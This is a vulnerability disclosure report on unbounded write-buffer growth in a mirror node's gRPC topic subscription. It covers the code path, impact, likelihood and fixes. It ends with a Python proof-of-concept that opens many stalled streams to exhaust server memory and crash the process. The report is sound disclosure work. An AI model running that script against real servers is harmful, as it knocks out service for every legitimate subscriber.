### Title
Unbounded Netty Write-Buffer Growth via Zero-Window gRPC Flow Control in `PollingTopicMessageRetriever.retrieve()`

### Summary
`ConsensusController.subscribeTopic()` subscribes to the reactive pipeline with `Long.MAX_VALUE` demand using `.subscribe(responseObserver::onNext, ...)` and never checks `ServerCallStreamObserver.isReady()`. When a client advertises a zero receive-window (or simply stops issuing `WINDOW_UPDATE` frames), `PollingTopicMessageRetriever.retrieve()` continues polling the database and pushing serialized messages into the Netty write buffer without any application-level backpressure, causing the buffer to grow without bound until JVM heap is exhausted, which terminates all subscribers sharing the same process.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` (lines 43–53):
```java
final var disposable = Mono.fromCallable(() -> toFilter(request))
    .flatMapMany(topicMessageService::subscribeTopic)
    .map(this::toResponse)
    .onErrorMap(ProtoUtil::toStatusRuntimeException)
    .subscribe(responseObserver::onNext,   // ← requests Long.MAX_VALUE, no isReady() check
               responseObserver::onError,
               responseObserver::onCompleted);
```

`PollingTopicMessageRetriever.retrieve()` (lines 45–63):
```java
return Flux.defer(() -> poll(context))
    .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
        .withFixedDelay(context.getFrequency())
        .withScheduler(scheduler))
    .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
    .timeout(retrieverProperties.getTimeout(), scheduler)   // ← only fires on emission gap, not slow consumer
    .doOnNext(context::onNext);
```

`poll()` (line 78):
```java
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

**Root cause and failed assumption:**

The design assumes that `responseObserver::onNext` provides natural backpressure. It does not. In grpc-java, `ServerCallStreamObserver.onNext()` is non-blocking: it serializes the protobuf message and hands it to Netty's write pipeline. When the HTTP/2 flow-control window for the client stream is zero, Netty queues the encoded frame in its channel write buffer. Because the controller never calls `serverCallStreamObserver.isReady()` and the reactive pipeline was subscribed with `Long.MAX_VALUE` demand, the retriever keeps polling the database and emitting messages at full speed into that queue.

The `.timeout(60s)` operator fires only when **no item is emitted** for 60 seconds. For a topic with a large historical backlog, `poll()` returns up to 1 000 messages every 2 s (throttled) or up to 5 000 messages every 20 ms (unthrottled), so the timeout never triggers while the backlog exists.

`SharedTopicListener` does apply `onBackpressureBuffer(maxBufferSize, ERROR)` for the live-listener path, but the historical-retriever path (`PollingTopicMessageRetriever`) has **no equivalent bound**.

`GrpcConfiguration` only sets `maxConcurrentCallsPerConnection = 5`; there is no limit on the number of connections, so an attacker multiplies impact by opening many connections.

### Impact Explanation

Each stalled stream accumulates serialized `ConsensusTopicResponse` frames in the Netty write buffer at a rate proportional to the historical backlog depth. For a topic with millions of messages and unthrottled polling (5 000 messages × ~200 bytes each = ~1 MB per 20 ms poll), a single stalled stream can consume hundreds of megabytes within seconds. Multiple concurrent stalled streams (attacker opens N connections × 5 streams each) exhaust the JVM heap, triggering `OutOfMemoryError`. This kills the gRPC process, severing all active topic subscriptions for every legitimate subscriber sharing the JVM — directly preventing gossip of new transactions to those subscribers.

### Likelihood Explanation

No authentication is required to call `subscribeTopic`. The gRPC port (5600) is publicly reachable. The attacker needs only a standard HTTP/2 client capable of advertising a zero initial window size (`SETTINGS_INITIAL_WINDOW_SIZE=0`) or simply never sending `WINDOW_UPDATE` after the initial window is consumed. This is trivially achievable with `grpc-java`, `grpcurl` with a custom transport, or any raw HTTP/2 library. The attack is repeatable and requires no knowledge of internal state beyond a valid topic ID (which is public on-chain).

### Recommendation

1. **Check `isReady()` before emitting** in `ConsensusController`: use `ServerCallStreamObserver.setOnReadyHandler()` to drive demand, or switch to the reactive-grpc `ReactorConsensusServiceGrpc` stub which propagates backpressure natively through the Reactor pipeline.
2. **Add `onBackpressureBuffer` with a bounded size and `ERROR` strategy** in `PollingTopicMessageRetriever.retrieve()`, mirroring what `SharedTopicListener` already does:
   ```java
   .onBackpressureBuffer(retrieverProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
   ```
3. **Limit total concurrent streams per server** via `NettyServerBuilder.maxConcurrentCallsPerConnection` (already present) **and** add a global connection/stream counter with a hard cap.
4. **Set a Netty write-buffer high-watermark** on the `NettyServerBuilder` to bound per-channel memory.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2, timestamp_pb2

def stall_stream(channel):
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),          # any topic with large history
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0), # from genesis
    )
    it = stub.subscribeTopic(req)
    # Receive exactly one message to open the stream, then stall
    next(it)
    # Never call next(it) again — HTTP/2 window fills, server buffers indefinitely

# Open many connections, each with 5 stalled streams
channels = [
    grpc.insecure_channel("mirror-node:5600",
        options=[("grpc.initial_reconnect_backoff_ms", 0)])
    for _ in range(50)
]
threads = [threading.Thread(target=stall_stream, args=(ch,)) for ch in channels for _ in range(5)]
for t in threads: t.start()
# Monitor server RSS — grows unboundedly until OOM kills the gRPC process
for t in threads: t.join()
```
